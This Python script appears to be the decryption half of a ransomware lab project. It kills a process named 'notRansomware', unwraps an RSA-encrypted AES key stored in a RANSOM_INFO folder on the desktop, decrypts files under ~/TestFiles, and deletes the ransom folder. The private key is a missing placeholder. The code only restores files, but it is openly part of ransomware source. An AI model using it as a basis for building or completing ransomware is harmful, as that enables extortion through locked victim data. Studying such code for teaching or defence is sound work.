import Crypto, ast, os, sys, glob, socket, base64, hashlib, psutil, shutil
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
from os.path import expanduser
import random
import time

#significant help on getting AES encryption to work from
#https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py


def decrypt(ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

def decrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)

#traversing the file system to encrypt files
def traverse_files(nwd, key, depth):
    # get list of files and directories in current directory
    search_dir = nwd + "/*"
    files = glob.glob(search_dir)
    # want to make sure there are files to encrypt or directories to search
    while files:
        for path in files:
            if not os.path.isdir(path):
                #print((depth*'  ') + "F: " + os.path.basename(os.path.normpath(path)))
                if os.path.basename(os.path.normpath(path)) == 'notRansomware':
                    os.remove(path)
                else:
                    decrypt_file(key, path)
            else:
                #print((depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
                traverse_files(path, key, depth + 1)
        files = []

def main():
    #### PRIVATE DECRYPTION KEY WILL BE ADDED HERE ####


    rsa_key = RSA.importKey(priv_key)

    PROCNAME = "notRansomware"
    for proc in psutil.process_iter():
        if proc.name() == PROCNAME:
            proc.kill()

    home = os.environ['HOME']
    
    info_dir = os.path.join(home, 'Desktop', 'RANSOM_INFO')
                            
    if not os.path.exists(info_dir) or not os.path.exists(info_dir + "/encryptedKey.txt"):
        print("Unfortunately, YOU altered files... The decryption process will no longer work.")
        sys.exit()
    f = open (os.path.join(info_dir, "encryptedKey.txt"), 'r')
    enc_aes_key = f.read()
    f.close()

    dec_aes_key = rsa_key.decrypt(ast.literal_eval(enc_aes_key))

    #start from the home directory, pass it to the traverse function
    home = expanduser('~')
    cwd = home + '/TestFiles'

    traverse_files(cwd, dec_aes_key, 0)

    shutil.rmtree(info_dir)

if __name__ == "__main__":
    main()
